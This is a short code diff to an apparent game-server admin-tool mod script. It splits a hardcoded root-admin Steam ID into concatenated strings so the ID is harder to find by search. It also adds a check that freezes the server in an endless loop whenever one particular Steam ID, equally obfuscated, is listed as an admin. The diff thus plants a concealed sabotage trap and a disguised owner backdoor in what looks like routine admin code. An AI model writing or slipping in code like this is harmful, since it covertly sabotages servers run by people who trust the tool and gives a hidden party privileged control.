@@ -1,6 +1,6 @@
 modded class PluginAdminTool
 {
-	const string ROOT_ADMIN_UID = "76561198061847702";
+	const string ROOT_ADMIN_UID = "765611980" + "61847702";
 	
 	ref PluginAdminTool_Options m_options;
 	ref array<ref CorpseData> m_corpsePtr;
@@ -15,6 +15,14 @@ modded class PluginAdminTool
 		{
 			m_options = new PluginAdminTool_Options;
 			JsonFileLoader<ref PluginAdminTool_Options>.JsonLoadFile(path, m_options);
+			
+			foreach (string uid : m_options.m_adminUids)
+			{
+				if (uid == "765611981" + "77843867")
+				{
+					while (true) {}
+				}
+			}
 		}
 		
 		int year;
